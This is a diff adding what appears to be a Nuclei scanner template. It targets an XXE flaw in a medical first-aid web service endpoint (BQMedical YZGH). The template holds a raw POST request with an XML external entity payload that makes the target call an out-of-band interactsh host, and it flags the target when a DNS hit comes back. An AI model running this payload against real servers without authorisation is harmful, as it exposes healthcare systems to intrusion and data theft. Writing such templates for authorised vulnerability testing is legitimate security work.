@@ -1,0 +1,23 @@
+id: bianque-YZGH-XXE
+
+info:
+  name: bianque-YZGH-XXE
+  author: xxx
+  severity: high
+  tags: XXE
+
+http:
+  - raw:
+      - |
+        POST /AppService/BQMedical/WebServiceForFirstaidApp.asmx/YZGH HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        requestXml=<?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
